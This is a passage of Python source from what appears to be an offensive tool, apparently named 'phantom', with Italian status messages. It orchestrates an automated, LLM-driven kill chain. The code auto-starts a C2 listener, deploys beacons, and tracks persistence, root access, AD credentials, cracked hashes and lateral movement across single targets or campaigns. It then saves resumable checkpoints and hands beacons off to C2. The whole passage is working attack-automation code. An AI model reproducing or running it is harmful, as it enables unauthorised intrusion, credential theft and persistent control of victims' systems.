                        f"{s.capability.stealth_level})[/] — {s.reason}")
        notifier.info("Dry-run completato: nessuna azione eseguita.")
        return

    # Fully automatic kill chain: the C2 listener must be up BEFORE any
    # beacon deploy so a deployed beacon has somewhere to check in. The
    # operator never has to start it manually — run_auto_mode brings its
    # own listener (HTTPS + auto-generated mTLS material, bound 0.0.0.0).
    from phantom.core.c2_server import server_instance
    from phantom.utils.network import get_c2_endpoint
    if not (server_instance.thread and server_instance.thread.is_alive()):
        _c2h, _c2p = get_c2_endpoint()
        notifier.status(f"Avvio listener C2 su 0.0.0.0:{_c2p} (HTTPS/mTLS auto)...")
        try:
            server_instance.start(host="0.0.0.0", port=_c2p, use_ssl=True)
        except Exception as exc:
            notifier.warn(f"Auto-start listener C2 fallito: {exc}")

    started_wall = time.time()
    out_root = resume or _report_out_dir()
    if resume:
        # resuming: reuse the checkpoint's own directory for reports so the
        # engagement artifacts stay together
        out_root = os.path.dirname(os.path.abspath(resume))
    if len(resolved) == 1:
        state_path = resume or os.path.join(out_root, "checkpoint.json")
        result, agent = _run_agent_single(
            resolved[0], goal, profile, aggressive, stealth, speed,
            scope_list, agents, verbose, on_event, llm,
            state_path=state_path)
        tdir, paths = _write_agent_reports(agent, profile, out_root, resolved[0])
        elapsed = _fmt_elapsed(time.time() - started_wall)
        if goal == "deep":
            st = result.get("stages") or {}
            ladder = " ".join(
                f"{k}={'✔' if st.get(k) else '—'}" for k in
                ("deliver", "post_exploit", "ad", "crack", "lateral"))
            notifier.success(
                f"Deep engagement completato (⏱ {elapsed}): "
                f"beacon={result.get('beacon_established')}, "
                f"persistenza={result.get('persistence_installed')}, "
                f"system/root={result.get('system_privilege')}, "
                f"AD creds={result.get('ad_creds')}, "
                f"cracked={result.get('cracked_hashes')}, "
                f"lateral={result.get('lateral_movements')}, "
                f"azioni={result.get('actions_taken')}")
            notifier.info(f"Stage ladder: {ladder}")
        else:
            notifier.success(
                f"Deliver completo (⏱ {elapsed}): beacon={result.get('beacon_established')}, "
                f"persistenza={result.get('persistence_installed')}, "
                f"creds={result.get('creds_found')}, "
                f"victim_ips={result.get('victim_ips')}, "
                f"ipotesi={result.get('hypotheses')} "
                f"({result.get('hypotheses_confirmed')} confermate), "
                f"azioni={result.get('actions_taken')}")
        notifier.info("Report (raw operatore + client sanificato):")
        _print_report_paths(paths)
        notifier.info(f"⏱ Tempo totale engagement: {elapsed}.")
        notifier.info(
            f"Checkpoint: {os.path.join(out_root, 'checkpoint.json')} — "
            "riprendi con `auto <target> --resume <file>` o condividi "
            "con `export-session` (.pm)")
        if result.get("beacon_established"):
            beacon_id = result.get("beacon_id") or ""
            if handoff_c2:
                _handoff_c2(beacon_id)
            elif on_event is not None:
                on_event("handoff", {"beacon_id": beacon_id})
        else:
            notifier.warn("Nessun beacon stabilito: niente handoff. "
                          "Usa 'c2' -> 'beacons' per monitorare callback")
        return

    campaign = _run_agent_campaign(
        resolved, goal, profile, aggressive, stealth, speed,
        scope_list, agents, verbose, on_event, llm,
        state_dir=out_root)
    elapsed = _fmt_elapsed(time.time() - started_wall)
    per_target = {}
    for t in resolved:
        a = campaign.get("_agents", {}).get(t)
        if a is not None:
            tdir, paths = _write_agent_reports(a, profile, out_root, t)
            per_target[t] = {"dir": tdir, **paths}
    from phantom.automation.reporting import CampaignReport, ReportWriter
    cpaths = ReportWriter(out_root).write_campaign(
        CampaignReport(campaign, profile, per_target))
    notifier.success(
        f"Campaign completata (⏱ {elapsed}): {campaign.get('beacons')} beacon, "
        f"{campaign.get('persistent')} persistenti, "
        f"{campaign.get('compromised_creds')} creds.")
    notifier.info(f"⏱ Tempo totale campagna: {elapsed}.")
    notifier.info("Report (per-target + campaign):")
    for k, p in {**per_target, **cpaths}.items():
        console.print(f"  [cyan]{k}[/]: {p}")
    first_beacon = ""
    for r in campaign.get("results", {}).values():
        if r.get("beacon_established") and not first_beacon:
            first_beacon = r.get("beacon_id", "")
    if first_beacon:
        if handoff_c2:
            _handoff_c2(first_beacon)
        elif on_event is not None:
            on_event("handoff", {"beacon_id": first_beacon})
    else:
        notifier.info("Nessun beacon stabilito. Usa 'c2' per monitorare.")
